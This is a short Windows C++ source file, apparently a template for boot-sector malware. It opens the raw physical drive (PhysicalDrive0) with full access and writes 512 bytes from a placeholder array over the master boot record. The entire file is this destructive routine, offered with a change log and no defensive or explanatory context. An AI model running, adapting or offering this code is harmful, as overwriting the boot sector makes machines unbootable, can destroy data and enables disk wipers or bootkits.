#include <windows.h>

// Edit 07/02/2020, chaneged the name file to "Source", and added the cpp extension.

// Edit 01/01/2022, fixed shitty grammar from past

// Edit 02/28/2025, Updated a lot of things.

const unsigned char HexData[] = { /*your hex data goes here*/ };

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine, int       nCmdShow
)
{
    DWORD BytesInjected;
    HANDLE hNewFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    WriteFile(hNewFile, HexData, 512, &BytesInjected, NULL); 
    CloseHandle(hNewFile); 
}
